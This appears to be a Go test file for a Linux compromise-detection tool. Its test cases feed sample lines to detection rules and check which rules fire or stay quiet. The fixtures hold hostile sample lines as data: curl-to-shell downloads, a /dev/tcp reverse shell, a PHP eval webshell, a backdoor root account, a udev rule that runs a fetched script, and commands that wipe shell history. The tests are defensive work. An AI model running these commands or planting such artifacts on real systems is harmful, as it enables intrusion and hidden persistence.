package linux

import (
	"slices"
	"testing"

	"karma/internal/model"
	"karma/internal/reader"
	"karma/internal/testkit"
)

// Rule hits for the catalog: each case feeds one line shaped like real target
// output and names the rule that must light. Cases with want as a negative rule
// lock the exclusions (the rules written around RE2's missing lookaround).
func TestLinuxCheckRules(t *testing.T) {
	cases := []struct {
		check string
		text  string
		want  string
	}{
		{"env", `LD_PRELOAD=/tmp/preload.so`, "ld-preload-var"},
		{"cron", `*/5 * * * * LD_PRELOAD=/tmp/.x.so /usr/sbin/backuptool`, "ld-preload-var"},
		{"shell-rc", `export LD_AUDIT=/tmp/audit.so`, "ld-preload-var"},
		{"env", `PATH=/usr/local/bin:/usr/bin:`, "env-path-dot"},
		{"env", `PYTHONPATH=/tmp/evil`, "env-python-path"},
		{"accounts", `backdoor:x:0:0::/:/bin/sh`, "acct-other-uid0"},
		{"accounts", `toor:x:0:1000::/:/bin/bash`, "acct-other-uid0"},
		{"accounts", `backdoor:x:0:0::/:/usr/sbin/nologin`, "acct-other-uid0"},
		{"accounts", `mysql:x:997:997::/var/lib/mysql:/bin/bash`, "acct-login-shell"},
		{"shadow", `root::18900:0:99999:7:::`, "shadow-empty-root"},
		{"shadow", `svc::18900:0:99999:7:::`, "shadow-empty"},
		{"groups", `sudo:x:27:alice`, "group-privileged"},
		{"groups", `backup:$6$salt$hash:18900:0:99999:7:::`, "group-password"},
		{"sudoers", `alice ALL=(ALL) NOPASSWD: ALL`, "sudo-nopasswd"},
		{"authorized-keys", `command="/tmp/s" ssh-ed25519 AAAA comment`, "authkeys-force-command"},
		{"sshd-config", `PermitRootLogin yes`, "sshd-permit-root-login"},
		{"sshd-config", `AuthorizedKeysFile .ssh/keys`, "sshd-authorized-keys-file"},
		{"sshd-config", `PasswordAuthentication yes`, "sshd-password-auth"},
		{"ssh-client-config", `ProxyCommand nc -x 10.0.0.8:1080 %h %p`, "ssh-client-proxy-command"},
		{"ps", `www-data  1234  0.0  0.1  1360  580 pts/0  Ss  /bin/sh`, "ps-service-shell"},
		{"ps", `root  1234  5.6  java -agentlib:jdwp=transport=dt_socket,server=y App`, "ps-jdwp"},
		{"ps", `www-data  2345  0.1  python3 -m http.server 8080`, "ps-http-server"},
		{"proc-caps", `context: container`, "cap-container-context"},
		{"proc-caps", `Current: cap_chown, cap_dac_override, cap_sys_admin`, "cap-sys-admin"},
		{"proc-caps", `CapEff: 000001ffffffffff  = cap_chown, cap_sys_admin`, "cap-sys-admin"},
		{"miner", `root  666  98.2  /tmp/xmrig -o stratum+tcp://pool.example.com:3333`, "miner-family"},
		{"miner", `root  667  1.2  ./run --pool stratum+tcp://pool.example.com:3333`, "miner-stratum"},
		{"miner", `-rw-r--r-- 1 root root 1234 Jun  1 10:00 /tmp/config.json`, "miner-config"},
		{"kallsyms", `ffffffffc0b08010 t diamorphine_init [diamorphine]`, "kallsyms-rootkit"},
		{"ps", `curl http://10.0.0.8/x.sh | sh`, "download-to-shell"},
		{"ps", `bash -i >& /dev/tcp/10.0.0.8/4444`, "shell-interactive"},
		{"listen", `ESTAB 0 0 10.0.0.5:22 5.6.7.8:4444 users:(("python",pid=1234))`, "net-interpreter-socket-ss"},
		{"deleted-exe", `/proc/1234/exe -> /tmp/.x (deleted)`, "deleted-binary"},
		{"deleted-exe", `sleep 2686147 root 0r REG 0,36 4 0 21655 /tmp/karma-del-test (deleted)`, "deleted-binary"},
		{"hidden-procs", `1234`, "proc-not-in-ps"},
		{"hidden-pids", `PID 42  fd=yes  comm=bash  cmd='/bin/bash -i'`, "hidden-pid"},
		{"cwd-tmp", `/proc/1234 -> /tmp/.x`, "proc-cwd-tmp"},
		{"firewall", `-A INPUT -p tcp --dport 22 -j ACCEPT`, "firewall-active"},
		{"tcp-wrappers", `sshd: ALL: spawn /tmp/x`, "wrappers-exec"},
		{"hosts-file", `10.0.0.8 evil.corp`, "hosts-nonlocal"},
		{"mounts", `//10.0.0.8/share /mnt/data cifs rw`, "mount-remote-fs"},
		{"services", `evil.service loaded auto-restart running`, "unit-crashloop"},
		{"cron", `@reboot /tmp/.x`, "cron-reboot"},
		{"cron", `*/1 * * * * /tmp/.x`, "cron-every-minute"},
		{"rc-local", `base64 -d ZwAh | sh`, "rc-b64-shell"},
		{"ld-preload", `/tmp/.preload.so`, "preload-entry"},
		{"shell-rc", `HISTFILE=/dev/null`, "history-off"},
		{"history", `history -c`, "history-clear"},
		{"tmp-listing", `-rw-r--r-- 1 root root 4096 Jun  1 10:00 /tmp/.backdoor`, "hidden-tmp-path"},
		{"key-dirs", `-rw------- 1 root root 1679 Jun  1 10:00 /root/.ssh/authorized_keys`, "ssh-material"},
		{"key-dirs", `drwxr-xr-x 1 root root 4096 Jun  1 10:00 /opt/chisel`, "tunnel-tool"},
		{"suid", `/home/deploy/find`, "suid-gtfobins"},
		{"suid", `/tmp/evil`, "suid-outside-system"},
		{"sgid", `/home/deploy/find`, "sgid-gtfobins"},
		{"sgid", `/var/lib/p`, "sgid-outside-system"},
		{"web-dirs", `/var/www/html/shell.php`, "web-script"},
		{"webshell-grep", `<?php @eval($_POST['c']); ?>`, "webshell-direct"},
		{"caps", `/usr/bin/x cap_setuid=ep`, "caps-setuid"},
		{"pkg-verify", `??5?????? c /etc/hosts`, "pkg-checksum"},
		{"pkg-verify", `/usr/sbin/sshd: ASCII text`, "bin-not-elf"},
		// the forensics sections list the files the verifier flagged: an ELF row
		// and an executable row are the replaced-binary case, in either channel's
		// row shape (the local tier's single spaces, GNU ls's padding)
		{"pkg-verify", `/bin/ls: ELF 64-bit LSB executable`, "pkg-changed-elf"},
		{"pkg-verify", `/usr/lib/x/libevil.so: ELF 64-bit LSB shared object`, "pkg-changed-elf"},
		{"pkg-verify", `-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`, "pkg-changed-exec"},
		{"pkg-verify", `-rwxr-xr-x  1 root root  8600 May 18 07:20 /bin/ls`, "pkg-changed-exec"},
		{"pkg-verify", `-rw-rwxr-- 1 root root 8600 May 18 07:20 /usr/lib/x/helper`, "pkg-changed-exec"},
		{"pkg-verify", `-rw-rw-rwx 1 root root 8600 May 18 07:20 /usr/lib/x/helper`, "pkg-changed-exec"},
		{"pkg-history", `2025-06-01 10:20 install nginx:amd64 <none> 1.18.0`, "pkg-changed"},
		{"pkg-history", `Commandline: apt-get install -y nginx`, "pkg-apt-record"},
		{"modules-load", `evil_module`, "modules-boot-entry"},
		{"modules-hidden", `HIDDEN rootkit`, "module-hidden"},
		{"module-files", `-rw-r--r-- 1 root root 184320 Jun  1 10:00 rc_kernel.ko`, "module-files-out-of-tree"},
		{"tainted", `64`, "kernel-tainted"},
		{"module-sig-config", `CONFIG_MODULE_SIG=n`, "module-sig-off"},
		{"dmesg", `[    0.000000] module verification failed: taint flag set`, "dmesg-taint"},
		{"log-dirs", `-rw-r----- 1 www adm 0 Jun  1 10:00 access.log`, "logdir-middleware"},
	}

	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.check)
		if !slices.Contains(testkit.HitIDs(t, tc.text, check), tc.want) {
			t.Errorf("%s should light %s: %q", tc.check, tc.want, tc.text)
		}
	}
}

// The exclusions carry the other half of the precision: these lines must stay quiet.
func TestLinuxRuleExclusions(t *testing.T) {
	cases := []struct {
		check string
		text  string
		quiet string
	}{
		{"accounts", `root:x:0:0:root:/root:/bin/bash`, "acct-other-uid0"},
		{"shadow", `root:!:18900:0:99999:7:::`, "shadow-empty-root"},
		{"sshd-config", `PermitRootLogin no`, "sshd-permit-root-login"},
		{"hosts-file", `127.0.0.1 localhost`, "hosts-nonlocal"},
		{"env", `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`, "env-path-dot"},
		{"pkg-verify", `..5?????? c /etc/hosts`, "bin-not-elf"},
		{"suid", `/usr/bin/sudo`, "suid-outside-system"},
		{"suid", `/usr/lib/openssh/ssh-keysign`, "suid-outside-system"},
		{"suid", `/usr/lib64/x`, "suid-outside-system"},
		{"suid", `/usr/libexec/y`, "suid-outside-system"},
		{"suid", `/usr/local/bin/z`, "suid-outside-system"},
		{"sgid", `/usr/lib/x86_64-linux-gnu/utempter/utempter`, "sgid-outside-system"},
		// the temp listing's hidden-entry rule is the global one, so its standard
		// system entries stay quiet here too
		{"tmp-listing", `drwxrwxrwt 2 root root 4096 Jun  1 10:00 /tmp/.X11-unix`, "hidden-tmp-path"},
		{"tmp-listing", `-rw-r--r-- 1 root root 4096 Jun  1 10:00 /tmp/.pwd.lock`, "hidden-tmp-path"},
		// a changed conffile is the administrator's edit: the binary rules leave
		// its rows and the text-type rows alone
		{"pkg-verify", `-rw-r--r-- 1 root root 358 May 16 15:05 /etc/default/syslog-ng`, "pkg-changed-exec"},
		{"pkg-verify", `-rw-r--r-- 1 root root 358 May 16 15:05 /etc/default/syslog-ng`, "pkg-changed-elf"},
		{"pkg-verify", `/etc/logrotate.conf: ASCII text`, "pkg-changed-elf"},
		// a directory row carries execute bits but is not a program
		{"pkg-verify", `drwxr-xr-x 2 root root 4096 May 16 15:05 /usr/share/x`, "pkg-changed-exec"},
	}
	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.check)
		if slices.Contains(testkit.HitIDs(t, tc.text, check), tc.quiet) {
			t.Errorf("%s must stay quiet on: %q (%s)", tc.check, tc.text, tc.quiet)
		}
	}
}

// The special-bit rules divide the listing: a setuid/setgid binary under the
// system program directories is a stock install, and one anywhere else — the
// backdoor's classic placement — lights the outside-system rule.
func TestSpecialBitsOutsideSystemDirs(t *testing.T) {
	suid, sgid := testkit.CheckByID(t, All, "suid"), testkit.CheckByID(t, All, "sgid")
	flagged := map[*model.Check][]struct{ path, rule string }{
		suid: {
			{"/tmp/evil", "suid-outside-system"},
			{"/home/deploy/find", "suid-outside-system"},
			{"/opt/vendor/helper", "suid-outside-system"},
			{"/var/lib/p", "suid-outside-system"},
		},
		sgid: {
			{"/usr/local/share/x", "sgid-outside-system"},
			{"/srv/backup/tool", "sgid-outside-system"},
		},
	}
	for check, entries := range flagged {
		for _, entry := range entries {
			if !slices.Contains(testkit.HitIDs(t, entry.path, check), entry.rule) {
				t.Errorf("%s should light %s on %s", check.ID, entry.rule, entry.path)
			}
		}
	}
}

// A rule's span is what the panel paints, so it must cover the whole token the
// reason names; a pattern that stopped after the first character painted half of
// a path or a hostname.
func TestLinuxRuleSpansCoverTheToken(t *testing.T) {
	cases := []struct {
		check string
		text  string
		rule  string
		want  string
	}{
		{"cron", `10 * * * * root /etc/.help.sh`, "hidden-nonhome-path", "/etc/.help.sh"},
		{"cron", `*/5 * * * * /tmp/.x`, "hidden-tmp-path", "/tmp/.x"},
		{"hosts-file", `172.17.0.6 cace4a393ea9`, "hosts-nonlocal", "172.17.0.6 cace4a393ea9"},
		{"hosts-file", `172.17.0.6 evil.corp  # note`, "hosts-nonlocal", "172.17.0.6 evil.corp"},
		{"caps", `/usr/bin/x cap_setuid=ep`, "caps-setuid", "cap_setuid=ep"},
		{"caps", `/usr/bin/x cap_net_raw=ep`, "caps-present", "cap_net_raw=ep"},
		{"cwd-tmp", `/proc/1234 -> /tmp/evil/x.sh`, "proc-cwd-tmp", "/proc/1234 -> /tmp/evil/x.sh"},
		{"udev-rules", `RUN+="/bin/sh -c 'curl http://10.0.0.8/x|sh'"`, "udev-exec-key",
			`RUN+="/bin/sh -c 'curl http://10.0.0.8/x|sh'"`},
		// a changed binary is the whole record, not one field of it
		{"pkg-verify", `-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`, "pkg-changed-exec",
			`-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`},
		{"pkg-verify", `/bin/ls: ELF 64-bit LSB executable`, "pkg-changed-elf",
			`/bin/ls: ELF 64-bit LSB executable`},
	}
	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.check)
		document := reader.Analyze(tc.text, check.Rules, check.Filters, check.Normalize, 0)
		spans := 0
		for _, section := range document.Sections {
			for _, line := range section.Lines {
				for _, match := range line.Matches {
					if match.ID != tc.rule {
						continue
					}
					spans++
					if got := line.Text[match.Start:match.End]; got != tc.want {
						t.Errorf("%s %s paints %q, want %q", tc.check, tc.rule, got, tc.want)
					}
				}
			}
		}
		if spans == 0 {
			t.Errorf("%s should light %s: %q", tc.check, tc.rule, tc.text)
		}
	}
}
